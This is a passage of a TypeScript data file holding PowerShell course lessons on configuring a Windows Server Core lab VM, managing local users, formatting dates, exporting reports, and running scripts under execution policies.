import { Lesson } from '../types';

export const LESSONS_PART_2: Lesson[] = [
  // ==========================================================================
  // CHAPTER 9: BUILDING A HEADLESS WINDOWS SERVER CORE FROM SCRATCH
  // ==========================================================================
  {
    id: '9-1',
    chapterId: 'chapter-09',
    slug: 'headless-server-core-build',
    title: 'Step-by-Step Headless Server Core Build: Hostname, Static IP & DNS',
    subtitle: 'Draw the network diagram, configure 192.168.56.20/24 with DNS at 192.168.56.10, verify every step, and save configureCoreServerBasic.ps1 (lab VMs only)',
    estimatedMinutes: 35,
    diagramId: 'core-network-svg',
    oneSentenceSummary:
      'On a headless Windows Server Core machine with no GUI, a handful of PowerShell commands (`Rename-Computer`, `Set-NetIPInterface`, `New-NetIPAddress`, `Set-DnsClientServerAddress`) turn a bare lab VM into a correctly named, statically addressed server. Lab setup: see the Lab Setup page.',
    summary:
      'When you boot a fresh Windows Server Core machine for the first time, there is no Start Menu, no taskbar, and no Control Panel, just a lonely terminal window. In this lesson, I walk you through the sequence for bringing up a bare Server Core VM in our lab (`SRV-CORE01` at `192.168.56.20/24` on the `LabNet` switch, using the domain controller `DC01` at `192.168.56.10` as its DNS server), verifying every step, and saving the entire build as a reusable script (`configureCoreServerBasic.ps1`). **Lab VMs only:** this lesson changes the IP address, the computer name and reboots the machine, so never run it on your real PC. Lab setup: see the Lab Setup page.',
    whyItMatters:
      'In real datacenters, **Windows Server Core** is widely preferred for many server roles because removing the Desktop Experience GUI means fewer components to patch, less RAM and disk use, and a smaller attack surface.',
    learningObjectives: [
      'Launch PowerShell from a fresh Server Core console (`sconfig` Option 15 or typing `powershell` in `cmd.exe`) and run `Update-Help -Force`',
      'Inspect the current hostname (`$env:COMPUTERNAME`), rename the server with `Rename-Computer -NewName`, and know why a reboot is required to finalize it',
      'Discover the right network adapter’s `ifIndex` using `Get-NetAdapter` (pick it explicitly by name, do not guess)',
      'Turn DHCP off with `Set-NetIPInterface`, then assign a static IPv4 address and subnet prefix (`/24`) with `New-NetIPAddress` and configure DNS servers using `Set-DnsClientServerAddress`',
    ],
    keyTerms: [
      'Windows Server Core (Headless OS)',
      'Rename-Computer',
      'Get-NetAdapter & ifIndex (InterfaceIndex)',
      'New-NetIPAddress & PrefixLength (/24)',
      'Set-DnsClientServerAddress',
      'configureCoreServerBasic.ps1',
    ],
    conceptSections: [
      {
        heading: 'Step 1 & 2: Entering PowerShell on Server Core, Updating Help & Renaming the Host',
        body: [
          'When you first log into a fresh Windows Server Core installation, you land either in `cmd.exe` or the text menu `sconfig`. If you are in `sconfig`, select **Option 15** to exit to the command line; if you are in `cmd.exe`, type **`powershell`** to launch PowerShell.',
          '**LAB VMs ONLY.** Everything in this lesson changes the IP address and name of the machine it runs on, and the script reboots it. Run it only inside the `SRV-CORE01` lab VM, never on your laptop, a work PC or a production server. Lab setup: see the Lab Setup page.',
          '`Update-Help -Force` downloads the help files from the internet. Our `LabNet` switch is internal and has no internet, so either do this once while the VM has a temporary NAT adapter, or skip it and read help on another machine. It is nice to have, not required for the rest of the lesson.',
          'Next, replace the random factory hostname (like `WIN-8K49A2L`) with a clean, meaningful server name:\n• Check the current name: **`$env:COMPUTERNAME`** (or `hostname`)\n• Preview the rename safely: **`Rename-Computer -NewName "SRV-CORE01" -WhatIf`**\n• Rename the computer: **`Rename-Computer -NewName "SRV-CORE01"`**\n• **Important:** Renaming a Windows host does not take full effect until the machine restarts (`Restart-Computer`). You can pass `-Restart` once you are sure, or reboot yourself after the IP and DNS are configured.',
        ],
      },
      {
        heading: 'Step 3 & 4: Discovering the Adapter Index (ifIndex) and Assigning a Static IP & DNS',
        body: [
          'A server can never rely on a changing DHCP address, clients and firewalls expect a fixed **Static IP**. Look at our lab network topology:\n• **Server Core IP:** `192.168.56.20` (`SRV-CORE01`)\n• **Subnet Mask:** `255.255.255.0` → which is **`PrefixLength 24`** (24 network bits: `8 + 8 + 8 = 24`)\n• **DNS server:** `192.168.56.10` (`DC01`, the domain controller)\n• **Default gateway:** none. `LabNet` is an internal switch with no router, so we skip `-DefaultGateway` here. On a real network you would add the router’s address.',
          'How do we tell PowerShell *which* network card to configure? Run **`Get-NetAdapter`** and look at the **`ifIndex`** and `Name` columns (for example, `ifIndex 4` or `12`). If your VM has more than one adapter (say a NAT one and the `LabNet` one), choose the `LabNet` adapter by name. Do not just take the first one that is `Up`. Then run three commands:\n1. **Turn DHCP off first.** Hyper-V and VirtualBox adapters default to DHCP, and `New-NetIPAddress` fails on a DHCP-enabled interface:\n   `Set-NetIPInterface -InterfaceIndex 4 -Dhcp Disabled`\n2. **Assign the Static IPv4 and Subnet Prefix:**\n   `New-NetIPAddress -InterfaceIndex 4 -IPAddress 192.168.56.20 -PrefixLength 24`\n3. **Point the DNS Client at the DNS Server:**\n   `Set-DnsClientServerAddress -InterfaceIndex 4 -ServerAddresses 192.168.56.10`',
        ],
      },
      {
        heading: 'Step 5: Verifying Everything & Saving configureCoreServerBasic.ps1',
        body: [
          'Never assume a network change worked, always verify with the matching `Get-*` cmdlets:\n• **`Get-NetIPAddress -InterfaceIndex 4 -AddressFamily IPv4`** (Check `IPAddress` and `PrefixLength`)\n• **`Get-NetIPConfiguration -InterfaceIndex 4`** (Shows IP, Default Gateway, and DNS together!)\n• **`Get-DnsClientServerAddress -InterfaceIndex 4 -AddressFamily IPv4`** (Check `ServerAddresses`)\n• **`Test-Connection 192.168.56.10 -Count 2`** (Verify layer-3 reachability to the domain controller; on Windows PowerShell 5.1 the parameter for a target is `-ComputerName`, the positional form shown here works on both)',
          'Finally, in keeping with the **DRY principle**, we save all these commands into **`configureCoreServerBasic.ps1`** so the next Server Core lab VM is a one-script job instead of a dozen typed commands.',
        ],
      },
    ],
    calloutNotes: [
      {
        type: 'key',
        title: 'The One-Sentence Version',
        body: 'Find your NIC’s `ifIndex` with `Get-NetAdapter`, turn DHCP off with `Set-NetIPInterface`, set the IP with `New-NetIPAddress`, set DNS with `Set-DnsClientServerAddress`, and set the hostname with `Rename-Computer`. Lab VMs only.',
      },
      {
        type: 'gotcha',
        title: 'Why Subnet Mask 255.255.255.0 Is Written as -PrefixLength 24',
        body: '`New-NetIPAddress` does not take dotted subnet masks like `255.255.255.0`. It uses CIDR prefix notation: `/8` = `255.0.0.0`, `/16` = `255.255.0.0`, and **`/24` = `255.255.255.0`**.',
      },
      {
        type: 'pro',
        title: 'Modifying an Existing IP vs. Creating a New IP',
        body: 'If an interface already has a static IP and you want to change its subnet mask, use `Set-NetIPAddress`. If you are replacing an old static IP completely, run `Remove-NetIPAddress` first and then `New-NetIPAddress`.',
      },
    ],
    commandBreakdowns: [
      {
        cmdlet: 'New-NetIPAddress',
        aliases: [],
        syntax: 'New-NetIPAddress -InterfaceIndex <UInt32> -IPAddress <String> -PrefixLength <Byte> [-DefaultGateway <String>]',
        parameters: [
          {
            name: '-InterfaceIndex',
            type: 'UInt32',
            description: 'The numeric ifIndex of the network adapter from Get-NetAdapter.',
          },
          {
            name: '-IPAddress',
            type: 'String',
            description: 'The static IPv4 or IPv6 address to assign (e.g., 192.168.56.20).',
          },
          {
            name: '-PrefixLength',
            type: 'Byte',
            description: 'The subnet mask bit length (e.g., 24 for 255.255.255.0).',
          },
          {
            name: '-DefaultGateway',
            type: 'String',
            description: 'Optional. The IP address of the router/gateway on the same subnet. Our isolated LabNet has no router, so the lab leaves it out.',
          },
        ],
        examples: [
          'New-NetIPAddress -InterfaceIndex 4 -IPAddress "192.168.56.20" -PrefixLength 24',
        ],
      },
      {
        cmdlet: 'Set-DnsClientServerAddress',
        aliases: [],
        syntax: 'Set-DnsClientServerAddress -InterfaceIndex <UInt32> -ServerAddresses <String[]>',
        parameters: [
          {
            name: '-InterfaceIndex',
            type: 'UInt32',
            description: 'The numeric ifIndex of the network adapter.',
          },
          {
            name: '-ServerAddresses',
            type: 'String[]',
            description: 'One or more DNS server IP addresses (e.g., "192.168.56.10" for DC01).',
          },
        ],
        examples: [
          'Set-DnsClientServerAddress -InterfaceIndex 4 -ServerAddresses "192.168.56.10"',
        ],
      },
    ],
    codeExamples: [
      {
        title: 'Complete configureCoreServerBasic.ps1 Production Script',
        description: 'The complete, self-documented provisioning script for a headless Windows Server Core host.',
        code: `# =====================================================================
# Script: configureCoreServerBasic.ps1
# LAB VM ONLY (SRV-CORE01 on the LabNet switch). Do NOT run on a real PC.
# Purpose: Initial headless configuration of Windows Server Core
# =====================================================================

# 0. Pick the adapter explicitly by name. List yours first with Get-NetAdapter.
$adapterName = 'Ethernet'
$adapter = Get-NetAdapter -Name $adapterName -ErrorAction Stop
$ifIndex = $adapter.ifIndex
Write-Output "Configuring Adapter: $($adapter.Name) (ifIndex: $ifIndex)"

# 1. Turn DHCP off, otherwise New-NetIPAddress fails (lab adapters default to DHCP)
Set-NetIPInterface -InterfaceIndex $ifIndex -Dhcp Disabled

# 2. Assign the static IPv4 address (no gateway: LabNet is an isolated switch)
New-NetIPAddress -InterfaceIndex $ifIndex \`
  -IPAddress '192.168.56.20' \`
  -PrefixLength 24

# 3. Point the DNS client at the domain controller (DC01)
Set-DnsClientServerAddress -InterfaceIndex $ifIndex \`
  -ServerAddresses '192.168.56.10'

# 4. Verify IP and DNS settings
Get-NetIPAddress -InterfaceIndex $ifIndex -AddressFamily IPv4 |
  Select-Object InterfaceAlias, IPAddress, PrefixLength
Get-DnsClientServerAddress -InterfaceIndex $ifIndex -AddressFamily IPv4 |
  Select-Object InterfaceAlias, ServerAddresses

# 5. Preview the rename first. Remove -WhatIf, then reboot when you are ready.
Rename-Computer -NewName 'SRV-CORE01' -WhatIf
# Rename-Computer -NewName 'SRV-CORE01'
# Restart-Computer`,
        output: `Configuring Adapter: Ethernet (ifIndex: 4)

InterfaceAlias IPAddress     PrefixLength
-------------- ---------     ------------
Ethernet       192.168.56.20           24

InterfaceAlias ServerAddresses
-------------- ---------------
Ethernet       {192.168.56.10}

What if: Performing the operation "Rename-Computer" on target "Renaming computer from 'WIN-8K49A2L' to 'SRV-CORE01'".`,
      },
    ],
    mistakesAndTraps: [
      {
        mistake: 'Guessing `-InterfaceIndex 1` or taking the first adapter that is `Up` without checking which one it is.',
        cause: 'InterfaceIndex 1 is often the loopback pseudo-interface, and a VM with a NAT adapter plus a LabNet adapter has two `Up` adapters, so "the first one" can be the wrong network.',
        fix: 'Run `Get-NetAdapter` first and select the adapter by `-Name` (or the exact `ifIndex`) of the one on LabNet.',
      },
      {
        mistake: 'Running `New-NetIPAddress` and getting an error that the interface is already configured or the address conflicts.',
        cause: 'The adapter still has DHCP enabled (or an old IP), so a second static address cannot be added cleanly.',
        fix: 'Run `Set-NetIPInterface -InterfaceIndex <n> -Dhcp Disabled` first. If an old static address exists, `Remove-NetIPAddress` it before creating the new one.',
      },
      {
        mistake: 'Pasting the whole script on your own PC or a work server.',
        cause: 'The script re-addresses the NIC and renames the machine, which can cut your network and break domain membership.',
        fix: 'Only run it inside the SRV-CORE01 lab VM. Take a VM checkpoint first so you can roll back.',
      },
    ],
    tryItYourself: [
      'Run `Get-NetAdapter` on your machine right now and identify the `ifIndex` and `MacAddress` of your primary network interface.',
      'Run `Get-NetIPAddress -AddressFamily IPv4` and `Get-DnsClientServerAddress -AddressFamily IPv4` to inspect your current IP, PrefixLength, and DNS servers.',
    ],
    knowledgeCheck: [
      {
        question: 'Which cmdlet assigns a new static IPv4 address, subnet prefix length (/24), and default gateway to a network adapter?',
        options: [
          'Set-DnsClientServerAddress',
          'New-NetIPAddress',
          'Get-NetAdapter',
          'Rename-Computer',
        ],
        correctIndex: 1,
        explanation: 'New-NetIPAddress takes -InterfaceIndex, -IPAddress, -PrefixLength and an optional -DefaultGateway to configure static IPv4 addressing (turn DHCP off with Set-NetIPInterface first).',
      },
      {
        question: 'In New-NetIPAddress, what value do you pass to -PrefixLength to represent the subnet mask 255.255.255.0?',
        options: ['8', '16', '24', '32'],
        correctIndex: 2,
        explanation: '255.255.255.0 has three full octets of 1s (8 + 8 + 8 = 24 bits), which is /24 (PrefixLength 24).',
      },
    ],
  },

  {
    id: '9-2',
    chapterId: 'chapter-09',
    slug: 'hands-on-admin-workout',
    title: 'The Complete Hands-On Admin Workout: Local Users, Processes, Disks & Dates',
    subtitle: 'Practice every real-world task: local user creation from custom objects, disk inspection, date formatting, and HTML exports',
    estimatedMinutes: 30,
    oneSentenceSummary:
      'Put your core skills together by provisioning local user accounts via `[PSCustomObject]` pipeline binding, formatting dates without hitting the `mm` vs `MM` trap, inspecting disks, and exporting service reports to TXT, CSV, and HTML.',
    summary:
      'Now that our Server Core lab machine is online (Lab setup: see the Lab Setup page), let’s run through a complete, real-world administrative workout. Do it on the lab VMs, not on your real PC. You will create local user accounts (`New-LocalUser`) both directly and by piping a `[PSCustomObject]` `ByPropertyName`, inspect disk volumes, solve the classic `Get-Date -Format "dd-MM-yyyy"` capital-`MM` month vs. lowercase-`mm` minutes trap, and generate multi-format system reports.',
    whyItMatters:
      'These exact tasks, creating local admin/service accounts, calculating process runtimes, formatting timestamps for log filenames, and exporting audit reports, are the building blocks of every enterprise script you will ever write.',
    learningObjectives: [
      'List, create, and remove local user accounts using `Get-LocalUser`, `New-LocalUser`, and `Remove-LocalUser`',
      'Pipe a `[PSCustomObject]@{ Name=...; Description=...; Password=$securePwd }` directly into `New-LocalUser` via `ByPropertyName` binding',
      'Format dates accurately with `Get-Date -Format "dd-MM-yyyy"` (knowing why `MM` is Month and `mm` is Minute!)',
      'Export filtered service and process reports to plain text (`Out-File`), CSV (`Export-Csv`), and HTML (`ConvertTo-Html | Out-File`)',
    ],
    keyTerms: [
      'New-LocalUser / Get-LocalUser / Remove-LocalUser',
      'ByPropertyName Object Provisioning',
      'Get-Date -Format "dd-MM-yyyy" (MM vs mm)',
      'Get-Volume & Get-Disk',
      'Export-Csv -NoTypeInformation',
      'ConvertTo-Html | Out-File',
    ],
    conceptSections: [
      {
        heading: 'Provisioning Local Users: Direct Parameters vs. Piping a [PSCustomObject]',
        body: [
          'The `Microsoft.PowerShell.LocalAccounts` module gives you full control over local accounts on any workstation or Server Core machine:\n• List all local accounts: **`Get-LocalUser`**\n• Create an account with an encrypted password. Ask for the password at the prompt, never type it into the script:\n  `$securePwd = Read-Host "Enter password" -AsSecureString`\n  `New-LocalUser -Name "Operator01" -Password $securePwd -FullName "Ops Account" -Description "Server Operator"`\n• Delete the account: **`Remove-LocalUser -Name "Operator01"`**\n\nPractice on the lab VMs, not on your real PC. A note on the variable name: `$pwd` is already an automatic variable (the current folder, same as `$PWD`), so call your password variable `$securePwd`.',
          '**The Pro Move (Piping a `[PSCustomObject]` into `New-LocalUser`):** Because `New-LocalUser` accepts `-Name`, `-Description`, and `-Password` **`ByPropertyName`**, you can package a user’s attributes inside a `[PSCustomObject]` and pipe it straight into `New-LocalUser`:\n`$newUser = [PSCustomObject]@{ Name = "AuditAdmin"; Description = "Security Auditor"; Password = $securePwd }`\n`$newUser | New-LocalUser`',
        ],
      },
      {
        heading: 'The Famous Get-Date Formatting Trap: Capital MM (Month) vs. Lowercase mm (Minute)!',
        body: [
          'When you name log files or print report timestamps, you will use **`Get-Date -Format "..."`**. Memorize this `.NET` date formatting rule right now, because getting it wrong puts the current **minute of the hour** where the **month** belongs:\n• **`dd`:** Two-digit Day (`03`)\n• **`MM` (UPPERCASE!):** Two-digit **Month** (`11` for November) - or `MMMM` for full month name (`November`)\n• **`mm` (lowercase!):** Two-digit **Minute** (`00` - `59`)\n• **`yyyy`:** Four-digit Year (`2026`)\n• **`HH` vs `hh`:** `HH` is 24-hour clock (`00` - `23`); `hh` is 12-hour clock (`01` - `12`).',
          'So if you want `03-11-2026`, the command is:\n**`Get-Date -Format "dd-MM-yyyy"`** *(never `"dd-mm-yyyy"`!)*',
        ],
      },
      {
        heading: 'Exporting System Reports: Out-File vs. Export-Csv vs. ConvertTo-Html',
        body: [
          'How do you save your pipeline output to disk so a manager or auditor can read it?\n1. **Plain Text (`Out-File`):** Saves screen-style text to a `.txt` file:\n   `Get-Service | Where-Object Status -eq "Running" | Out-File -FilePath C:\\Reports\\running.txt`\n2. **Structured Spreadsheet (`Export-Csv`):** Saves every object property as a clean CSV column ready for Excel:\n   `Get-Service | Select-Object Name, DisplayName, Status | Export-Csv -Path C:\\Reports\\services.csv -NoTypeInformation`\n3. **Web Report (`ConvertTo-Html | Out-File`):** Notice the verb is **`ConvertTo`**, not `Export`! `ConvertTo-Html` converts objects into HTML strings in memory, which you then pipe to **`Out-File`** to save as an `.html` file:\n   `Get-Service | Select-Object Name, DisplayName, Status | ConvertTo-Html -Title "Service Audit" | Out-File C:\\Reports\\services.html`',
        ],
      },
    ],
    calloutNotes: [
      {
        type: 'key',
        title: 'The One-Sentence Version',
        body: 'In `Get-Date -Format`, uppercase `MM` is Month while lowercase `mm` is Minute; and `ConvertTo-Html` transforms objects in memory so you must pipe it to `Out-File` to save a file.',
      },
      {
        type: 'gotcha',
        title: 'Export-Csv vs. ConvertTo-Html',
        body: '`Export-Csv` writes directly to a file on disk (`-Path`). `ConvertTo-Html` and `ConvertTo-Json` only convert the objects into strings in the pipeline, you still need `| Out-File report.html` to write them to disk!',
      },
      {
        type: 'try',
        title: 'Test the MM vs. mm Trap Live',
        body: 'Run `Get-Date -Format "dd-MM-yyyy HH:mm:ss"` right now and compare the `MM` (month) value with the `mm` (minutes) value.',
      },
    ],
    commandBreakdowns: [
      {
        cmdlet: 'New-LocalUser',
        aliases: [],
        syntax: 'New-LocalUser [-Name] <String> -Password <SecureString> [-Description <String>] [-FullName <String>]',
        parameters: [
          {
            name: '-Name',
            type: 'String',
            description: 'Specifies the username for the new local user account (accepts pipeline input ByPropertyName).',
          },
          {
            name: '-Password',
            type: 'SecureString',
            description: 'Specifies the password as a SecureString object (accepts pipeline input ByPropertyName).',
          },
        ],
        examples: [
          '$securePwd = Read-Host "Password" -AsSecureString ; New-LocalUser -Name "LabAdmin" -Password $securePwd',
        ],
      },
      {
        cmdlet: 'Get-Date',
        aliases: [],
        syntax: 'Get-Date [-Format <String>]',
        parameters: [
          {
            name: '-Format',
            type: 'String',
            description: 'Formats the date using .NET format specifiers (dd = day, MM = month, yyyy = year, HH = 24h hour, mm = minute).',
          },
        ],
        examples: ['Get-Date -Format "dd-MM-yyyy"', 'Get-Date -Format "yyyy-MM-dd_HH-mm"'],
      },
    ],
    codeExamples: [
      {
        title: 'Local User Provisioning via [PSCustomObject], Date Formatting, and HTML Reporting',
        description: 'Create a local user from a custom object, format dates accurately, and export an HTML report of running services.',
        code: `# 1. Format current date as dd-MM-yyyy (Capital MM = Month!)
$today = Get-Date -Format 'dd-MM-yyyy'
Write-Output "Report Date: $today"

# 2. Provision a Local User by piping a [PSCustomObject] (Binds ByPropertyName!)
#    The password is typed at a prompt as a SecureString, never stored in the script.
$securePwd = Read-Host 'Enter a password for the lab account' -AsSecureString
$userSpec = [PSCustomObject]@{
  Name        = 'TempLabUser'
  Description = "Created on $today"
  Password    = $securePwd
}
# Lab VM only. Run these two lines yourself when you are ready:
# $userSpec | New-LocalUser -WhatIf
# Remove-LocalUser -Name 'TempLabUser'

# 3. Export Running Services to an HTML file
$htmlPath = Join-Path $env:TEMP 'RunningServices.html'
Get-Service |
  Where-Object Status -eq 'Running' |
  Select-Object Name, DisplayName, Status |
  ConvertTo-Html -Title "Running Services ($today)" |
  Out-File -FilePath $htmlPath

Write-Output "Saved HTML report to: $htmlPath"`,
        output: `Report Date: 03-11-2026
Saved HTML report to: C:\\Users\\student\\AppData\\Local\\Temp\\RunningServices.html`,
      },
    ],
    mistakesAndTraps: [
      {
        mistake: 'Writing `Get-Date -Format "dd-mm-yyyy"` with a lowercase `mm`.',
        cause: 'In `.NET` date formatting, lowercase `m` stands for **minute**, whereas uppercase `M` stands for **Month**.',
        fix: 'Always use uppercase `MM` for months: `Get-Date -Format "dd-MM-yyyy"`.',
      },
    ],
    tryItYourself: [
      'Run `Get-Date -Format "dd-MM-yyyy"` and `Get-Date -Format "yyyy-MM-dd HH:mm:ss"`.',
      'Run `Get-Volume` to inspect all drive letters, file systems (`NTFS`), health statuses, and remaining free space on your machine.',
    ],
    knowledgeCheck: [
      {
        question: 'Which command outputs the current date in Day-Month-Year format (e.g., 03-11-2026)?',
        options: [
          'Get-Date -Format "dd-mm-yyyy"',
          'Get-Date -Format "dd-MM-yyyy"',
          'Get-Date -Display "Day-Month-Year"',
          'Format-Date -Day -Month -Year',
        ],
        correctIndex: 1,
        explanation: 'Uppercase MM represents the two-digit Month (01 to 12), whereas lowercase mm represents minutes (00 to 59).',
      },
      {
        question: 'Why must you pipe `ConvertTo-Html` into `Out-File` to create an .html file on disk?',
        options: [
          'ConvertTo-Html only converts objects into HTML text lines in memory; Out-File writes those lines to a file on disk',
          'ConvertTo-Html is an alias for Get-Process',
          'Out-File compiles C# code',
          'HTML files can only be saved in C:\\Windows',
        ],
        correctIndex: 0,
        explanation: 'ConvertTo-* cmdlets convert objects in memory and emit strings to the pipeline; Out-File (or Set-Content) writes those strings to disk.',
      },
    ],
  },

  // ==========================================================================
  // CHAPTER 10: SCRIPTS, EXECUTION POLICIES & CONTROL FLOW LOGIC
  // ==========================================================================
  {
    id: '10-1',
    chapterId: 'chapter-10',
    slug: 'scripts-and-execution-policies',
    title: 'Writing Your First .ps1 Scripts, How .\\ Works & Execution Policies',
    subtitle: 'Save, run and troubleshoot a .ps1 script, fix the "running scripts is disabled" error, and understand why Execution Policy is a seatbelt, not a firewall',
    estimatedMinutes: 25,
    oneSentenceSummary:
      'PowerShell scripts are plain-text `.ps1` files that you launch with an explicit path (`.\\script.ps1` for the current folder) once your Execution Policy allows it (for example `RemoteSigned`), and that policy is a safety seatbelt against accidents, not a security boundary.',
    summary:
      'Any sequence of commands you can run at the prompt can be saved into a `.ps1` file and run a thousand times. But the first time you try to run `myscript.ps1`, two different things can stop you: typing `myscript.ps1` without a path gives a "not recognized" error (PowerShell does not search the current folder), and on a Windows client the default Execution Policy `Restricted` gives a **"running scripts is disabled on this system"** error. They look similar but have different fixes. In this lesson we learn both and write a reusable `.ps1` script you can extend.',
    whyItMatters:
      'Understanding why PowerShell wants an explicit path like `.\\` (so a lookalike file in the current folder is never run by accident) and what each of the main Execution Policies (`Restricted`, `AllSigned`, `RemoteSigned`, `Unrestricted`) actually does is essential for every sysadmin and security engineer. Just as important is knowing what the policy does NOT do: it does not stop a determined user.',
    learningObjectives: [
      'Write, comment (`#` and `<# ... #>`), and save `.ps1` scripts',
      'Explain that PowerShell does not search the current folder for commands, so you run a local script with `.\\script.ps1` (or a full path)',
      'Recognise and fix the two common first-script errors: "not recognized" (missing `.\\`) and "running scripts is disabled on this system" (Execution Policy `Restricted`)',
      'Compare the 4 core Execution Policies: `Restricted`, `AllSigned`, `RemoteSigned` (recommended), and `Unrestricted`',
      'Inspect and configure execution policies using `Get-ExecutionPolicy -List` and `Set-ExecutionPolicy RemoteSigned -Scope CurrentUser`',
    ],
    keyTerms: [
      '.ps1 Script File',
      '.\\ Relative Path Execution Rule',
      'Execution Policy (Seatbelt vs Boundary)',
      'Restricted vs. RemoteSigned vs. AllSigned vs. Unrestricted',
      'Get-ExecutionPolicy & Set-ExecutionPolicy',
      'Mark of the Web (Zone.Identifier)',
    ],
    conceptSections: [
      {
        heading: 'Why You Must Type .\\myscript.ps1 (Explicit Paths, Not Current-Folder Lookups)',
        body: [
          'In old MS-DOS and `cmd.exe`, if you were sitting inside `C:\\Temp` and typed `ping`, the shell checked `C:\\Temp` *first* before looking in `C:\\Windows\\System32`. If someone dropped a fake `ping.bat` inside `C:\\Temp`, you could accidentally run it.',
          'PowerShell does not do that. **When you type a bare name, PowerShell looks in the folders listed in `$env:PATH`, not in the current folder.** So `myscript.ps1` fails with "not recognized" even though the file is right there. To run a file in the current folder you give an explicit path, and `.\\` simply means "this folder":\n`Set-Location C:\\Scripts`\n`.\\myscript.ps1`\nA full path works equally well: `& "C:\\Scripts\\myscript.ps1"` (the `&` call operator is needed when the path is quoted). This rule is about *how the command name is looked up*; it is a small safety habit, not a security product. Document your scripts using `#` for single-line comments or `<# ... #>` for multi-line comment blocks.',
        ],
      },
      {
        heading: 'The 4 Execution Policies: Why I Recommend RemoteSigned',
        body: [
          'To stop users from accidentally double-clicking random `.ps1` scripts, PowerShell enforces an **Execution Policy**:\n1. **`Restricted` (Default on Windows Client):** Blocks **all** `.ps1` scripts from running (interactive commands only). The error you see is: *"File ... cannot be loaded because running scripts is disabled on this system."*\n2. **`AllSigned`:** Every script, even one you just wrote yourself on your own machine, must be digitally signed by a trusted code-signing certificate.\n3. **`RemoteSigned` (Default on Windows Server & My Recommended Setting):** Scripts you write **locally** on your own machine run freely without needing a signature, **but** any script downloaded from the internet (which carries the NTFS "Mark of the Web" stream) is blocked unless digitally signed!\n4. **`Unrestricted` / `Bypass`:** Runs all scripts (warns on downloaded scripts in `Unrestricted`; no warnings at all in `Bypass`).',
          'To check and update your policy for your own account (no Administrator shell needed):\n`Get-ExecutionPolicy -List`\n`Set-ExecutionPolicy RemoteSigned -Scope CurrentUser`\nTo undo it later, set it back: `Set-ExecutionPolicy Undefined -Scope CurrentUser`. If a Group Policy sets the `MachinePolicy` or `UserPolicy` scope, that wins and your `Set-ExecutionPolicy` will not change the effective result. `Get-ExecutionPolicy -List` shows which scope is in charge.',
        ],
      },
    ],
    calloutNotes: [
      {
        type: 'key',
        title: 'The One-Sentence Version',
        body: 'Use `Set-ExecutionPolicy RemoteSigned -Scope CurrentUser` so your own local `.ps1` scripts run cleanly via `.\\script.ps1` while unsigned internet downloads stay blocked. It is a seatbelt against accidents, not a lock against attackers.',
      },
      {
        type: 'danger',
        title: 'Security Lens: Execution Policy Is a Seatbelt, NOT a Security Boundary!',
        body: 'Never rely on `Restricted` or `AllSigned` to stop a real attacker who already has terminal access. Microsoft itself says the policy is not a security boundary: anyone can run `powershell.exe -ExecutionPolicy Bypass -File script.ps1`, paste the script text into the console, or pipe it into `Invoke-Expression`. Execution Policy protects legitimate admins from *accidents*; to actually block attackers, defenders use AppLocker/WDAC and Constrained Language Mode (Chapter 16).',
      },
      {
        type: 'pro',
        title: 'Unblocking a Safe Script Downloaded from GitHub',
        body: 'If you are running `RemoteSigned` and download a legitimate `.ps1` script from your team’s GitHub repo, inspect the code first and then run `Unblock-File -Path .\\script.ps1` to remove its Mark of the Web.',
      },
    ],
    commandBreakdowns: [
      {
        cmdlet: 'Set-ExecutionPolicy',
        aliases: [],
        syntax: 'Set-ExecutionPolicy [-ExecutionPolicy] <ExecutionPolicy> [-Scope <ExecutionPolicyScope>] [-Force]',
        parameters: [
          {
            name: '-ExecutionPolicy',
            type: 'ExecutionPolicy',
            description: 'Specifies the policy level: Restricted, AllSigned, RemoteSigned, Unrestricted, or Bypass.',
          },
          {
            name: '-Scope',
            type: 'ExecutionPolicyScope',
            description: 'Targets LocalMachine (default, requires Admin), CurrentUser, or Process (current window only).',
          },
        ],
        examples: [
          'Set-ExecutionPolicy RemoteSigned -Scope CurrentUser',
          'Set-ExecutionPolicy Undefined -Scope CurrentUser   # undo: remove your own setting',
          'Get-ExecutionPolicy -List',
        ],
      },
    ],
    codeExamples: [
      {
        title: 'Checking Execution Policies and Writing Interactive Admin Scripts',
        description: 'Inspect execution policies across all scopes and write a clean, parameterized service-filtering script.',
        code: `# 1. View Execution Policies across all scopes (MachinePolicy, UserPolicy, Process, CurrentUser, LocalMachine)
Get-ExecutionPolicy -List

# 2. Set RemoteSigned for the current user (no Admin prompt required)
#    Lab/own-account change. Undo any time with:
#    Set-ExecutionPolicy -ExecutionPolicy Undefined -Scope CurrentUser
Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser -Force

# 3. Save this as Get-ServicesByStatus.ps1, then run it with:  .\\Get-ServicesByStatus.ps1
<#
  .SYNOPSIS
  Prompts for a service status (Running or Stopped) and shows the first five matches.
#>
$targetStatus = Read-Host -Prompt "Enter status to filter (Running or Stopped)"
Get-Service |
  Where-Object Status -eq $targetStatus |
  Select-Object -First 5 Name, DisplayName, Status`,
        output: `        Scope ExecutionPolicy
        ----- ---------------
MachinePolicy       Undefined
   UserPolicy       Undefined
      Process       Undefined
  CurrentUser    RemoteSigned
 LocalMachine    RemoteSigned

Enter status to filter (Running or Stopped): Running

Name     DisplayName                             Status
----     -----------                             ------
Appinfo  Application Information                 Running
AudioSrv Windows Audio                           Running
BFE      Base Filtering Engine                   Running
BITS     Background Intelligent Transfer Service Running
Dnscache DNS Client                              Running`,
      },
    ],
    mistakesAndTraps: [
      {
        mistake: 'Typing `myscript.ps1` while inside `C:\\Scripts` and wondering why PowerShell says "The term is not recognized".',
        cause: 'PowerShell does not search the current directory for commands, only the folders in `$env:PATH`.',
        fix: 'Run `.\\myscript.ps1` (or the full path).',
      },
      {
        mistake: 'Running `.\\myscript.ps1` and getting "File cannot be loaded because running scripts is disabled on this system".',
        cause: 'The effective Execution Policy is `Restricted` (the Windows client default), or a Group Policy sets it.',
        fix: 'Run `Get-ExecutionPolicy -List` to see which scope decides. If it is yours to change, use `Set-ExecutionPolicy RemoteSigned -Scope CurrentUser`. If `MachinePolicy` or `UserPolicy` is set, ask your admin; it is not a bug.',
      },
      {
        mistake: 'Believing `AllSigned` or `Restricted` makes the machine safe from malicious scripts.',
        cause: 'Execution Policy only checks files launched as scripts. It is bypassed by `-ExecutionPolicy Bypass`, pasting code into the console, or `Invoke-Expression`.',
        fix: 'Treat it as a seatbelt. Real control comes from AppLocker/WDAC, Constrained Language Mode and logging (Chapter 16).',
      },
    ],
    tryItYourself: [
      'Run `Get-ExecutionPolicy -List` to see which Execution Policy is currently active on your machine.',
      'Save a 2-line script to `$env:TEMP\\hello.ps1` and run it using `& "$env:TEMP\\hello.ps1"`.',
